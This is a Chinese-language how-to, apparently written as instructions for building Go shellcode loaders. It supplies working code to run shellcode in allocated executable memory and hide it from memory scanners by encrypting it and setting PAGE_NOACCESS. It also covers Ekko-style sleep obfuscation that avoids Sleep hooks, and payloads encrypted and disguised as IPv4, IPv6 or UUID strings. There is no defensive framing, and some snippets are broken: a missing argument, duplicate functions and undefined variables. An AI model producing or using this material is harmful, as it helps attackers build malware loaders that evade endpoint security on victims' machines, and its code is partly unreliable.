# 内存规避技术（完整版）

## ⚠️ 关键：内存加密保护时机

**时机错误会导致shellcode无法执行或崩溃！**

| 模式 | 正确时机 | 错误时机 | 结果 |
|------|----------|----------|------|
| **单次执行** | 执行**完成后**加密 | 执行**前**加密 | 执行前加密=崩溃 |
| **Beacon长驻** | 睡眠期间加密 | 唤醒时加密 | 唤醒时加密=无法执行 |

**单次执行正确流程：**
```go
// ✓ 正确顺序
1. 分配内存 → 2. 复制shellcode → 3. 创建线程执行 → 
4. 等待完成 → 5. 加密内存 → 6. 设置PAGE_NOACCESS
```

**单次执行错误流程：**
```go
// ❌ 错误顺序（会崩溃）
1. 分配内存 → 2. 加密内存 → 3. 创建线程执行加密数据 = 崩溃！
```

**Beacon长驻正确流程：**
```go
// ✓ Beacon循环
while (running) {
    1. Beacon执行任务
    2. 准备睡眠 → 加密内存 + PAGE_NOACCESS
    3. 睡眠等待
    4. 唤醒 → 解密内存 + PAGE_EXECUTE_READ
    5. 继续执行
}
```

---

## 重要：SGN加密Shellcode处理说明

**SGN加密后的shellcode运行时无需解密SGN层！**

完整的加密和执行流程：

```
【加密阶段】（生成loader前）
原始shellcode → SGN加密 → DoubleXOR/ADD+XOR/AES加密 → IPv4/UUID/MAC混淆 → 嵌入Go数组

【运行阶段】（loader执行时）
IPv4数组 → 反混淆 → DoubleXOR/ADD+XOR/AES解密 → 直接执行
                                        ↑
                            【SGN自动解码，不需要额外解密】
```

---

## 必须技术：内存加密保护

**每个loader都必须实现内存加密保护！**

### 原理

shellcode执行期间和执行完成后，内存中的shellcode特征可能被内存扫描发现。
解决方案：在特定时机加密内存并设置为PAGE_NOACCESS，阻止内存扫描。

### 两种模式

| 模式 | 适用场景 | 时机 | 重要说明 |
|------|----------|------|----------|
| **单次执行模式** | 单次执行loader | 执行完成后立即加密 | 必须先等待完成再加密 |
| **Beacon长驻模式** | C2/Beacon长驻 | 睡眠期间加密 | 每次睡眠前加密，唤醒时解密 |

### 完整实现

```go
package main

import (
    "golang.org/x/sys/windows"
    "unsafe"
)

// 内存加密保护（必须技术）
// mode: "once" = 单次执行模式（执行后加密）
// mode: "sleep" = Beacon模式（睡眠期间加密）

func memoryEncryptProtect(addr uintptr, size uintptr, key []byte, mode string) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")

    // 1. 加密内存
    var oldProtect uint32
    VirtualProtect.Call(addr, size, 0x04, uintptr(unsafe.Pointer(&oldProtect))) // PAGE_READWRITE
    
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr ^= key[i%uintptr(len(key))]
    }

    // 2. 设置PAGE_NOACCESS（阻止内存扫描）
    VirtualProtect.Call(addr, size, 0x01, uintptr(unsafe.Pointer(&oldProtect)))

    if mode == "sleep" {
        // Beacon模式需要定时器/VEH机制在唤醒时解密
        // 实现见sleep_obfuscation.md
    }
}

// 单次执行loader完整流程
func executeShellcodeWithProtection(sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    CreateThread := kernel32.NewProc("CreateThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

    // 分配内存
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x40)
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

    // 执行
    thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
    WaitForSingleObject.Call(thread, 0xFFFFFFFF)

    // 【必须】内存加密保护（单次执行模式）
    protectKey := []byte{0xA7, 0xFE, 0x0C, 0xE5, 0xA3, 0x70, 0xAC, 0xB5}
    memoryEncryptProtect(addr, uintptr(len(sc)), protectKey, "once")
}
```

---

## 1. 正确的内存访问方式

**错误方式：**
```go
// ❌ 错误：直接将地址转换为slice指针
mem := (*[]byte)(unsafe.Pointer(addr))
(*mem)[i] ^= key[i]
```

**正确方式：**
```go
// ✓ 正确：使用unsafe.Slice或逐字节访问
mem := unsafe.Slice((*byte)(unsafe.Pointer(addr)), size)
mem[i] ^= key[i%len(key)]

// 或者逐字节访问
*(*byte)(unsafe.Pointer(addr + uintptr(i))) ^= key[i%len(key)]
```

---

## 2. 双重XOR加密内存（修复版）

```go
package main

import (
    "golang.org/x/sys/windows"
    "unsafe"
)

// 双重XOR加密内存（正确版）
func doubleXorEncryptMemory(addr uintptr, size uintptr, key1 []byte, key2 []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    // 修改内存保护为可读写
    var oldProtect uint32
    VirtualProtect.Call(addr, size, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 第一轮XOR加密
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr ^= key1[i%uintptr(len(key1))]
    }
    
    // 第二轮XOR加密
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr ^= key2[i%uintptr(len(key2))]
    }
    
    // 恢复内存保护
    VirtualProtect.Call(addr, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

// 双重XOR解密内存（顺序相反）
func doubleXorDecryptMemory(addr uintptr, size uintptr, key1 []byte, key2 []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    var oldProtect uint32
    VirtualProtect.Call(addr, size, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 先用key2解密第二轮
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr ^= key2[i%uintptr(len(key2))]
    }
    
    // 再用key1解密第一轮
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr ^= key1[i%uintptr(len(key1))]
    }
    
    VirtualProtect.Call(addr, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}
```

---

## 3. Ekko睡眠混淆（简化稳定版）

**注意：定时器回调方式复杂且不稳定，推荐使用简化版睡眠混淆。**

```go
// 简化版睡眠混淆：双重XOR加密后等待，再解密执行
func simpleSleepObfuscation(duration uint32, addr uintptr, size uintptr, key1 []byte, key2 []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    NtDelayExecution := windows.NewLazySystemDLL("ntdll.dll").NewProc("NtDelayExecution")

    // 1. 双重XOR加密shellcode内存区域
    var oldProtect uint32
    VirtualProtect.Call(addr, size, 0x04, uintptr(unsafe.Pointer(&oldProtect))) // PAGE_READWRITE
    doubleXorEncryptMemory(addr, size, key1, key2)

    // 2. 设置PAGE_NOACCESS
    VirtualProtect.Call(addr, size, 0x01, uintptr(unsafe.Pointer(&oldProtect)))

    // 3. 使用NtDelayExecution等待（不触发Sleep Hook）
    var delay uint64 = uint64(duration) * 1000 * 10000 // 100ns单位
    NtDelayExecution.Call(0, uintptr(unsafe.Pointer(&delay)))

    // 4. 双重XOR解密shellcode
    VirtualProtect.Call(addr, size, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
    doubleXorDecryptMemory(addr, size, key1, key2)

    // 5. 设置PAGE_EXECUTE_READ
    VirtualProtect.Call(addr, size, 0x20, uintptr(unsafe.Pointer(&oldProtect)))
}

// 双重XOR加密内存（辅助函数）
func doubleXorEncryptMemoryHelper(addr uintptr, size uintptr, key1 []byte, key2 []byte) {
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr ^= key1[i%uintptr(len(key1))]
        *ptr ^= key2[i%uintptr(len(key2))]
    }
}

// 双重XOR解密内存（辅助函数）
func doubleXorDecryptMemoryHelper(addr uintptr, size uintptr, key1 []byte, key2 []byte) {
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr ^= key2[i%uintptr(len(key2))] // 先key2
        *ptr ^= key1[i%uintptr(len(key1))] // 再key1
    }
}
```

---

## 4. ADD+XOR组合加密（推荐）

**原理：使用ADD加法 + 双重XOR，三重混淆，强度更高**

```go
// ADD+XOR组合加密（三重混淆）
// 加密流程：ADD(key1) → XOR(key2) → XOR(key3)
func addXorEncrypt(data []byte, addKey []byte, xorKey1 []byte, xorKey2 []byte) []byte {
    result := make([]byte, len(data))
    
    // 第一轮：ADD加法
    for i := range data {
        result[i] = data[i] + addKey[i%len(addKey)]
    }
    
    // 第二轮：XOR（使用xorKey1）
    for i := range result {
        result[i] = result[i] ^ xorKey1[i%len(xorKey1)]
    }
    
    // 第三轮：XOR（使用xorKey2）
    for i := range result {
        result[i] = result[i] ^ xorKey2[i%len(xorKey2)]
    }
    
    return result
}

// ADD+XOR组合解密（顺序相反）
// 解密流程：XOR(xorKey2) → XOR(xorKey1) → SUB(addKey)
func addXorDecrypt(data []byte, addKey []byte, xorKey1 []byte, xorKey2 []byte) []byte {
    result := make([]byte, len(data))
    
    // 第一轮解密：XOR（使用xorKey2）
    for i := range data {
        result[i] = data[i] ^ xorKey2[i%len(xorKey2)]
    }
    
    // 第二轮解密：XOR（使用xorKey1）
    for i := range result {
        result[i] = result[i] ^ xorKey1[i%len(xorKey1)]
    }
    
    // 第三轮解密：SUB减法（ADD的逆操作）
    for i := range result {
        result[i] = result[i] - addKey[i%len(addKey)]
    }
    
    return result
}

// 生成三重密钥
func generateAddXorKeys() ([]byte, []byte, []byte) {
    addKey := make([]byte, 16)
    xorKey1 := make([]byte, 16)
    xorKey2 := make([]byte, 16)
    
    // 使用不同种子生成三个密钥
    for i := 0; i < 16; i++ {
        addKey[i] = byte((i * 13 + 29) % 256)  // ADD密钥
        xorKey1[i] = byte((i * 17 + 31) % 256) // XOR密钥1
        xorKey2[i] = byte((i * 23 + 47) % 256) // XOR密钥2
    }
    
    return addKey, xorKey1, xorKey2
}

// 内存ADD+XOR加密
func addXorEncryptMemory(addr uintptr, size uintptr, addKey []byte, xorKey1 []byte, xorKey2 []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    var oldProtect uint32
    VirtualProtect.Call(addr, size, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 第一轮：ADD
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr = *ptr + addKey[i%uintptr(len(addKey))]
    }
    
    // 第二轮：XOR(key1)
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr = *ptr ^ xorKey1[i%uintptr(len(xorKey1))]
    }
    
    // 第三轮：XOR(key2)
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr = *ptr ^ xorKey2[i%uintptr(len(xorKey2))]
    }
    
    VirtualProtect.Call(addr, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

// 内存ADD+XOR解密
func addXorDecryptMemory(addr uintptr, size uintptr, addKey []byte, xorKey1 []byte, xorKey2 []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    var oldProtect uint32
    VirtualProtect.Call(addr, size, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 第一轮解密：XOR(key2)
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr = *ptr ^ xorKey2[i%uintptr(len(xorKey2))]
    }
    
    // 第二轮解密：XOR(key1)
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr = *ptr ^ xorKey1[i%uintptr(len(xorKey1))]
    }
    
    // 第三轮解密：SUB
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr = *ptr - addKey[i%uintptr(len(addKey))]
    }
    
    VirtualProtect.Call(addr, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}
```

### ADD+XOR vs 其他加密对比

| 特性 | DoubleXOR | ADD+XOR组合 | ChaCha20 |
|------|-----------|-------------|----------|
| 密钥数量 | 2个 | 3个 | 1个+Nonce |
| 混淆操作 | XOR | ADD+XOR | 流加密 |
| 混淆强度 | 中 | 高 | 高 |
| 实现复杂度 | 简单 | 简单 | 简单(标准库) |
| 外部依赖 | 无 | 无 | Go标准库 |

### ADD+XOR使用示例

```go
// 生成Loader时的加密流程
func encryptShellcodeWithAddXor(shellcode []byte) ([]byte, []byte, []byte, []byte) {
    addKey, xorKey1, xorKey2 := generateAddXorKeys()
    encrypted := addXorEncrypt(shellcode, addKey, xorKey1, xorKey2)
    return encrypted, addKey, xorKey1, xorKey2
}

// Loader运行时的解密流程
func decryptShellcodeWithAddXor(encrypted []byte, addKey []byte, xorKey1 []byte, xorKey2 []byte) []byte {
    return addXorDecrypt(encrypted, addKey, xorKey1, xorKey2)
}
```

---

## 5. UUID混淆与反混淆（重要）

**关键说明：UUID混淆必须使用简单顺序处理，不进行Windows字节序反转！**

Windows UUID格式虽然有复杂的字节序规则，但为了简化处理并避免生成/解析不一致的问题，我们采用简单顺序处理方式。

```go
import "strings"

// UUID反混淆（简单顺序处理，不反转字节序）
func deobfuscateUUID(uuidList []string) []byte {
    var result []byte
    for _, uuid := range uuidList {
        // 直接去掉所有"-"，按原始字节顺序读取
        hexStr := strings.ReplaceAll(uuid, "-", "")
        result = append(result, hexToBytes(hexStr)...)
    }
    return result
}

// hexToBytes: 十六进制字符串转字节
func hexToBytes(hex string) []byte {
    var result []byte
    for i := 0; i < len(hex); i += 2 {
        var b byte
        for _, c := range hex[i:min(i+2, len(hex))] {
            if c >= '0' && c <= '9' {
                b = b*16 + byte(c-'0')
            } else if c >= 'a' && c <= 'f' {
                b = b*16 + byte(c-'a'+10)
            } else if c >= 'A' && c <= 'F' {
                b = b*16 + byte(c-'A'+10)
            }
        }
        result = append(result, b)
    }
    return result
}

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}

// UUID混淆（生成UUID字符串数组）
func obfuscateToUUID(data []byte) []string {
    var result []string
    for i := 0; i < len(data); i += 16 {
        chunk := data[i:min(i+16, len(data))]
        // 补齐到16字节
        if len(chunk) < 16 {
            chunk = append(chunk, make([]byte, 16-len(chunk))...)
        }
        // 按顺序生成UUID格式：8-4-4-4-12字符
        uuid := bytesToHex(chunk[0:4]) + "-" +
                bytesToHex(chunk[4:6]) + "-" +
                bytesToHex(chunk[6:8]) + "-" +
                bytesToHex(chunk[8:10]) + "-" +
                bytesToHex(chunk[10:16])
        result = append(result, uuid)
    }
    return result
}

func bytesToHex(b []byte) string {
    result := ""
    for _, v := range b {
        result += string(hexChar(v>>4)) + string(hexChar(v&0x0F))
    }
    return result
}

func hexChar(v byte) byte {
    if v < 10 {
        return '0' + v
    }
    return 'a' + v - 10
}
```

---

## 6. IPv4混淆与反混淆（推荐使用）

IPv4混淆无字节序问题，最简单稳定，推荐使用。

```go
// IPv4反混淆
func deobfuscateIPv4(ipv4List []string) []byte {
    var result []byte
    for _, ip := range ipv4List {
        parts := strings.Split(ip, ".")
        for _, part := range parts {
            var b byte
            for _, c := range part {
                b = b*10 + byte(c-'0')
            }
            result = append(result, b)
        }
    }
    return result
}

// IPv4混淆（生成IPv4地址数组）
func obfuscateToIPv4(data []byte) []string {
    var result []string
    for i := 0; i < len(data); i += 4 {
        chunk := data[i:min(i+4, len(data))]
        ip := fmt.Sprintf("%d.%d.%d.%d", chunk[0], chunk[1], chunk[2], chunk[3])
        result = append(result, ip)
    }
    return result
}
```

---

## 7. IPv6混淆与反混淆（新增）

IPv6地址为128位（16字节），与UUID处理类似，适合大块数据混淆。

**IPv6格式：** `2001:0db8:85a3:0000:0000:8a2e:0370:7334`（8组16位十六进制）

```go
import (
    "fmt"
    "strings"
)

// IPv6反混淆
func deobfuscateIPv6(ipv6List []string) []byte {
    var result []byte
    for _, ipv6 := range ipv6List {
        // 去掉所有冒号
        hexStr := strings.ReplaceAll(ipv6, ":")
        result = append(result, hexToBytes(hexStr)...)
    }
    return result
}

// hexToBytes: 十六进制字符串转字节
func hexToBytes(hex string) []byte {
    var result []byte
    for i := 0; i < len(hex); i += 2 {
        var b byte
        for _, c := range hex[i:min(i+2, len(hex))] {
            if c >= '0' && c <= '9' {
                b = b*16 + byte(c-'0')
            } else if c >= 'a' && c <= 'f' {
                b = b*16 + byte(c-'a'+10)
            } else if c >= 'A' && c <= 'F' {
                b = b*16 + byte(c-'A'+10)
            }
        }
        result = append(result, b)
    }
    return result
}

// IPv6混淆（生成IPv6地址数组）
func obfuscateToIPv6(data []byte) []string {
    var result []string
    for i := 0; i < len(data); i += 16 {
        chunk := data[i:min(i+16, len(data))]
        // 补齐到16字节
        if len(chunk) < 16 {
            chunk = append(chunk, make([]byte, 16-len(chunk))...)
        }
        
        // IPv6格式：8组16位十六进制数，用冒号分隔
        // 每组2字节，格式如 2001:0db8:85a3:0000:0000:8a2e:0370:7334
        ipv6 := fmt.Sprintf("%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x",
            chunk[0], chunk[1], chunk[2], chunk[3], chunk[4], chunk[5], chunk[6], chunk[7],
            chunk[8], chunk[9], chunk[10], chunk[11], chunk[12], chunk[13], chunk[14], chunk[15])
        result = append(result, ipv6)
    }
    return result
}

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}
```

### IPv6 vs IPv4 vs UUID对比

| 特性 | IPv4 | IPv6 | UUID |
|------|------|------|------|
| 数据块大小 | 4字节 | 16字节 | 16字节 |
| 地址格式 | 192.168.1.1 | 2001:0db8:... | 550e8400-... |
| 每块字符数 | ~15 | ~39 | ~36 |
| 适用场景 | 小shellcode | 大shellcode | 大shellcode |
| 字节序问题 | 无 | 无 | 无（简单顺序处理） |

### IPv6混淆使用示例

```go
// 生成Loader时的混淆流程
func obfuscateShellcodeToIPv6(encrypted []byte) []string {
    return obfuscateToIPv6(encrypted)
}

// Loader运行时的反混淆流程
func deobfuscateIPv6Shellcode(ipv6List []string) []byte {
    return deobfuscateIPv6(ipv6List)
}

// 完整流程示例
func loaderWithIPv6(ipv6List []string, key []byte) {
    // 1. IPv6反混淆
    encrypted := deobfuscateIPv6(ipv6List)
    
    // 2. 解密（如使用DoubleXOR）
    shellcode := doubleXorDecrypt(encrypted, key1, key2)
    
    // 3. 执行shellcode...
}
```

---

## 8. AES加密（BCrypt）

```go
func aesEncryptBCrypt(data []byte, key []byte) []byte {
    bcrypt := windows.NewLazySystemDLL("bcrypt.dll")
    
    BCryptOpenAlgorithmProvider := bcrypt.NewProc("BCryptOpenAlgorithmProvider")
    BCryptGenerateSymmetricKey := bcrypt.NewProc("BCryptGenerateSymmetricKey")
    BCryptEncrypt := bcrypt.NewProc("BCryptEncrypt")
    BCryptDestroyKey := bcrypt.NewProc("BCryptDestroyKey")
    BCryptCloseAlgorithmProvider := bcrypt.NewProc("BCryptCloseAlgorithmProvider")
    
    // 1. 打开AES算法提供者
    var hAlgorithm uintptr
    aesName, _ := windows.UTF16PtrFromString("AES")
    BCryptOpenAlgorithmProvider.Call(uintptr(unsafe.Pointer(&hAlgorithm)),
        uintptr(unsafe.Pointer(aesName)), 0, 0)
    
    // 2. 生成对称密钥
    var hKey uintptr
    BCryptGenerateSymmetricKey.Call(uintptr(unsafe.Pointer(&hKey)), hAlgorithm,
        0, 0, uintptr(unsafe.Pointer(&key[0])), uintptr(len(key)), 0)
    
    // 3. 加密数据（需要处理IV和Padding）
    // ...
    
    // 4. 清理
    BCryptDestroyKey.Call(hKey)
    BCryptCloseAlgorithmProvider.Call(hAlgorithm, 0)
    
    return nil // 返回加密数据
}
```

---

## 9. ChaCha20加密（推荐）

**特点：**
- 现代流加密算法，安全性高于传统加密
- Go标准库`crypto/chacha20`直接支持，无需调用Windows API
- 32字节密钥，12字节Nonce（更安全）
- 加密解密速度快，实现简单

```go
import (
    "crypto/chacha20"
    "crypto/cipher"
)

// ChaCha20加密
func chacha20Encrypt(data []byte, key []byte, nonce []byte) []byte {
    // 密钥必须是32字节
    if len(key) != 32 {
        // 补齐或截断到32字节
        key = padKey(key, 32)
    }
    
    // Nonce必须是12字节（XChaCha20使用24字节）
    if len(nonce) != 12 {
        nonce = padKey(nonce, 12)
    }
    
    // 创建cipher
    cipher, err := chacha20.NewUnauthenticatedCipher(key, nonce)
    if err != nil {
        return nil
    }
    
    // 加密（流加密，加密解密相同）
    result := make([]byte, len(data))
    cipher.XORKeyStream(result, data)
    
    return result
}

// ChaCha20解密（与加密相同）
func chacha20Decrypt(data []byte, key []byte, nonce []byte) []byte {
    return chacha20Encrypt(data, key, nonce)
}

// 密钥补齐函数
func padKey(key []byte, targetLen int) []byte {
    result := make([]byte, targetLen)
    for i := 0; i < targetLen; i++ {
        if i < len(key) {
            result[i] = key[i]
        } else {
            result[i] = byte(i * 17 + 31) // 填充伪随机值
        }
    }
    return result
}

// 生成随机Nonce（12字节）
func generateNonce() []byte {
    nonce := make([]byte, 12)
    // 使用系统时间或其他随机源生成
    // 注意：同一密钥+Nonce组合不能重复使用
    return nonce
}

// 内存加密使用ChaCha20
func chacha20EncryptMemory(addr uintptr, size uintptr, key []byte, nonce []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    // 修改内存保护为可读写
    var oldProtect uint32
    VirtualProtect.Call(addr, size, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 读取内存数据
    data := make([]byte, size)
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        data[i] = *ptr
    }
    
    // ChaCha20加密
    encrypted := chacha20Encrypt(data, key, nonce)
    
    // 写回内存
    for i := uintptr(0); i < size; i++ {
        ptr := (*byte)(unsafe.Pointer(addr + i))
        *ptr = encrypted[i]
    }
    
    // 恢复内存保护
    VirtualProtect.Call(addr, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

// 内存解密使用ChaCha20
func chacha20DecryptMemory(addr uintptr, size uintptr, key []byte, nonce []byte) {
    chacha20EncryptMemory(addr, size, key, nonce) // 加密解密相同
}
```

### ChaCha20 vs 其他加密对比

| 加密方式 | 密钥长度 | 速度 | 安全性 | 实现复杂度 |
|----------|----------|------|--------|-----------|
| DoubleXOR | 两个16-32字节 | 最快 | 中 | 极简 |
| ADD+XOR | 三个16-32字节 | 快 | 高 | 简单 |
| AES | 16/24/32 | 中 | 高 | 中等 |
| **ChaCha20** | 32 | 快 | 高 | 简单 |

### 推荐使用场景

1. **大shellcode**：ChaCha20流加密不需要分块处理
2. **快速解密**：Go标准库实现，无需Windows API调用
3. **高安全性**：现代加密算法，安全性高
4. **内存加密**：配合睡眠混淆、内存保护使用

---

## 10. 内存保护常量

| 常量 | 值 | 说明 |
|------|-----|------|
| PAGE_NOACCESS | 0x01 | 无法访问 |
| PAGE_READONLY | 0x02 | 只读 |
| PAGE_READWRITE | 0x04 | 可读写 |
| PAGE_WRITECOPY | 0x08 | 写拷贝 |
| PAGE_EXECUTE | 0x10 | 可执行 |
| PAGE_EXECUTE_READ | 0x20 | 可执行只读 |
| PAGE_EXECUTE_READWRITE | 0x40 | 可执行可读写 |
| PAGE_EXECUTE_WRITECOPY | 0x80 | 可执行写拷贝 |

---

## 11. 注意事项

1. **内存访问**：使用 `unsafe.Slice` 或逐字节访问，不要直接转换地址为slice
2. **SGN特性**：SGN加密的shellcode运行时自动解码
3. **内存保护**：加密前修改为PAGE_READWRITE，加密后恢复
4. **密钥管理**：密钥需安全存储或动态生成
5. **避免RWX**：尽量使用PAGE_EXECUTE_READ而非RWX
6. **UUID处理**：使用简单顺序处理，不进行Windows字节序反转
7. **IPv4推荐**：IPv4混淆无字节序问题，最稳定
8. **ChaCha20**：同一密钥+Nonce组合不能重复使用加密不同数据